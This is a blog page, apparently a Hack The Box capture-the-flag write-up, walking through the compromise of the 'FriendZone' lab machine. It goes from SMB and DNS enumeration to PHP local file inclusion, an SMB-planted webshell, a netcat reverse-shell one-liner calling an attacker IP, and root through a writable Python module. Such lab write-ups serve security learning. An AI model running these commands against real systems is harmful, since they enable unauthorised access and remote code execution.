@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>FriendZone | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="1.nmap scan the machine opnes ftp,ssh,smbd and ssl the port 80 just a picture  SMB shares 445&#x2F;139first use smbmap to list shares and permissions smbmap -H 10.10.10.123   it can also get using smb">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FriendZone">
+<meta property="og:url" content="http://example.com/2022/07/19/FriendZone/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1.nmap scan the machine opnes ftp,ssh,smbd and ssl the port 80 just a picture  SMB shares 445&#x2F;139first use smbmap to list shares and permissions smbmap -H 10.10.10.123   it can also get using smb">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/nmap.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/smbscan.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/smbclient.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/nmapscript.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/Development.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/general.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/cred.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/dirsearch.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/robots.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/443pic.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/443.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/jsjs.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/jshint.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/dig1.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/dig2.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/dig3.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/host.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/login1.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/logindone.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/dashboard.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/dashboardpic.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/dirsearch2.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/lfi1.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/xss.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/wrong.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/base64.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/sourcecode.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/uploadsource.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/cmdphp.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/zyzphp.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/webshell.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/reverse.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/mysql.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/friend.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/pyscript.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/script.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/friendcanwrite.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/append.png">
+<meta property="og:image" content="http://example.com/2022/07/19/FriendZone/rootflag.png">
+<meta property="article:published_time" content="2022-07-20T03:34:51.000Z">
+<meta property="article:modified_time" content="2022-07-20T15:04:33.088Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/07/19/FriendZone/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-FriendZone" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/19/FriendZone/" class="article-date">
+  <time class="dt-published" datetime="2022-07-20T03:34:51.000Z" itemprop="datePublished">2022-07-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      FriendZone
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/19/FriendZone/nmap.png">
+the machine opnes ftp,ssh,smbd and ssl
+the port 80 just a picture
+
+<h5 id="SMB-shares-445-x2F-139"><a href="#SMB-shares-445-x2F-139" class="headerlink" title="SMB shares 445&#x2F;139"></a>SMB shares 445&#x2F;139</h5><p>first use smbmap to list shares and permissions</p>
+<pre><code>smbmap -H 10.10.10.123
+</code></pre>
+<img src="/2022/07/19/FriendZone/smbscan.png">
+it can also get using smbclient
+
+<pre><code>smbclient -N -L //10.10.10.123
+</code></pre>
+<p>-N represent null session (or no auth) and -L to list<br><img src="/2022/07/19/FriendZone/smbclient.png"><br>the comment of Files says that its &#x2F;etc&#x2F;Files<br>so we can use nmap to verify</p>
+<pre><code>nmap --script smb-enum-shares.nse -p445 10.10.10.123
+</code></pre>
+<img src="/2022/07/19/FriendZone/nmapscript.png">
+it will give me the path on target to the share
+
+<h6 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h6><p>The Development share is empty:<br><img src="/2022/07/19/FriendZone/Development.png"></p>
+<h6 id="general"><a href="#general" class="headerlink" title="general"></a>general</h6><p>The general share has a single file,we can get it and have a look<br><img src="/2022/07/19/FriendZone/general.png"><br>its a cred<br><img src="/2022/07/19/FriendZone/cred.png"></p>
+<h5 id="TCP-80"><a href="#TCP-80" class="headerlink" title="TCP 80"></a>TCP 80</h5><p>the site give us a new domain <code>friendzoneportal.red</code><br>we now use dirsearch to find some paths<br><img src="/2022/07/19/FriendZone/dirsearch.png"><br>the robots.txt just a phrase<br><img src="/2022/07/19/FriendZone/robots.png"><br>and the wordpress is empty dir</p>
+<h5 id="https-443"><a href="#https-443" class="headerlink" title="https 443"></a>https 443</h5><p>first use the comman name get via nmap to visit <code>https://friendzone.red:443/</code><br>the site just has a picture<br><img src="/2022/07/19/FriendZone/443pic.png"><br>and if we view page source,we can get another path<br><img src="/2022/07/19/FriendZone/443.png"><br>the js&#x2F;js path has a encode string,so we can try to decode it<br><img src="/2022/07/19/FriendZone/jsjs.png"><br>it also have a hint<br><img src="/2022/07/19/FriendZone/jshint.png"><br>i temporarily don’t know what’s the meaning of it</p>
+<h5 id="TCP-x2F-UDP-53"><a href="#TCP-x2F-UDP-53" class="headerlink" title="TCP&#x2F;UDP 53"></a>TCP&#x2F;UDP 53</h5><p>TCP is only used in DNS when the response size is greater than 512 bytes. Typically this is associated with Zone Transfers, where the server give all the information it has for a domain. There’s a few things I could try to enumerate DNS, but the fact that the host is listening on TCP 53 suggests the first thing I should try is a Zone Transfer.<br>I’ll do that with dig. I’ll start with friendzone.htb, and get nothing:<br><img src="/2022/07/19/FriendZone/dig1.png"><br>Since I have a domain name in the TLS certificate, I’ll try that:<br><img src="/2022/07/19/FriendZone/dig2.png"><br>I can also try the domain I got on the first webpage, “friendzoneportal.red”:<br><img src="/2022/07/19/FriendZone/dig3.png"><br>I’ll update my hosts file for each of these:<br><img src="/2022/07/19/FriendZone/host.png"></p>
+<h5 id="administrator1-friendzone-red"><a href="#administrator1-friendzone-red" class="headerlink" title="administrator1.friendzone.red"></a>administrator1.friendzone.red</h5><img src="/2022/07/19/FriendZone/login1.png">
+use the creds we get ,and we can in 
+<img src="/2022/07/19/FriendZone/logindone.png">
+visit /dashboard.php ,and we can find something else
+<img src="/2022/07/19/FriendZone/dashboard.png">
+we add the `?image_id=a.jpg&pagename=timestamp` to the path,and we can get another page
+<img src="/2022/07/19/FriendZone/dashboardpic.png">
+use dirsearch to search the path
+<img src="/2022/07/19/FriendZone/dirsearch2.png">
+it's has a image dir and has two pics
+and it's also has a page called timestamp.php
+
+<h4 id="2-get-webshell-access"><a href="#2-get-webshell-access" class="headerlink" title="2.get webshell access"></a>2.get webshell access</h4><h5 id="Find-LFI"><a href="#Find-LFI" class="headerlink" title="Find LFI"></a>Find LFI</h5><p>because the pic is load by the full path,we can try to find load file inclusion<br>1.image_id<br>The image_id, such as a.jpg is a full file name. I’ll try giving it a php page, which it would load if that file is being shown using include in php. Unfortunately, it just shows a broken image:<br><img src="/2022/07/19/FriendZone/lfi1.png"><br>Looking at the source, I see <code>&lt;img src=&#39;images/timestamp.php&#39;&gt;</code>. I could play with XSS here, and see if I can get it to load a script. For example, if I set <code>image_id=&#39; onerror=&#39;javascript: alert(&quot;XXS HERE&quot;);</code>, I get a pop-up:<br><img src="/2022/07/19/FriendZone/xss.png"><br>The source explains it: <code>&lt;img src=&#39;images/&#39; onerror=&#39;javascript: alert(&quot;XXS HERE&quot;);&#39;&gt;</code><br>2.pagename<br>Since the given example case is <code>timestamp</code>, and there’s a <code>timestamp.php</code> in the same directory, I can assume that this is likely doing a <code>include($_GET[&quot;pagename&quot;] . &quot;.php&quot;)</code>. I can test this by having it point to other php pages.<br>Visiting <code>https://administrator1.friendzone.red/login.php</code> returns: <code>Wrong!</code><br>and we change to pagename to login can also see the same word<br><img src="/2022/07/19/FriendZone/wrong.png"></p>
+<h5 id="read-PHP-resource"><a href="#read-PHP-resource" class="headerlink" title="read PHP resource"></a>read PHP resource</h5><p>I can use this LFI to read source code for these pages using php filters. If I visit <code>pagename=php://filter/convert.base64-encode/resource=dashboard</code>, I can see a long base64 string on the page:<br><img src="/2022/07/19/FriendZone/base64.png"><br>decoding it,and we can find something<br><img src="/2022/07/19/FriendZone/sourcecode.png"><br>we can do the same thing to read upload <code>pagename=php://filter/convert.base64-encode/resource=../uploads/upload</code><br><img src="/2022/07/19/FriendZone/uploadsource.png"></p>
+<h5 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h5><p>I want to use this LFI to include a webshell so I can run commands. I’ll use my smb access to drop a simple php command shell into the Development share, which nmap told me was &#x2F;etc&#x2F;Development.<br><img src="/2022/07/19/FriendZone/cmdphp.png"><br>and upload it to the machine</p>
+<pre><code>smbclient -N //10.10.10.123/Development -c &#39;put cmd.php zyz.php&#39;
+</code></pre>
+<img src="/2022/07/19/FriendZone/zyzphp.png">
+Now, on visiting `https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/zyz&cmd=id`, I get output:
+<img src="/2022/07/19/FriendZone/webshell.png">
+
+<p> I’ll use my go to from the <a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a> and visit: <code>https://administrator1.friendzone.red/dashboard.php?image_id=&amp;pagename=../../../etc/Development/zyz&amp;cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;%261|nc 10.10.16.10 4444 &gt;/tmp/f</code> (remembering to encode the &amp; as %26):<br><img src="/2022/07/19/FriendZone/reverse.png"><br>After a shell upgrade <code>(python -c &#39;import pty;pty.spawn(&quot;bash&quot;)&#39;</code>, <code>ctrl-z</code>, <code>stty raw -echo;fg</code>, <code>reset</code>, enter “screen” for terminal type if asked), I’ve got a full shell. And I can get user.txt.<br>In the &#x2F;var&#x2F;www&#x2F; directory, there’s folders for all the different sites, as well as an sql conf file:<br><img src="/2022/07/19/FriendZone/mysql.png"><br>use the password to su friend<br><img src="/2022/07/19/FriendZone/friend.png"></p>
+<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>search around the machine, there has a py script in &#x2F;opt&#x2F;server_admin<br><img src="/2022/07/19/FriendZone/pyscript.png"><br>find &#x2F;tmp can write to upload our <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a></p>
+<pre><code>our machine:python3 -m http.server 80
+target machine:wget http://10.10.16.10/pspy32s
+               chmod +x pspy32s
+       ./pspy32s
+</code></pre>
+<p>and we can find that root was running this script every two minutes:<br><img src="/2022/07/19/FriendZone/script.png"><br>via linpeas.sh,we find a file that friend can write<br><img src="/2022/07/19/FriendZone/friendcanwrite.png"><br>we append the following scripts to the end of it<br><img src="/2022/07/19/FriendZone/append.png"><br>and finally we get the root<br><img src="/2022/07/19/FriendZone/rootflag.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/19/FriendZone/" data-id="cl5tqbzxf00031ycp5w8cgzjh" data-title="FriendZone" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/07/18/Delivery/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Delivery</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/07/19/FriendZone/">FriendZone</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/18/Delivery/">Delivery</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/17/Horizontall/">Horizontall</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/16/Previse/">Previse</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/16/Armageddon/">Armageddon</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
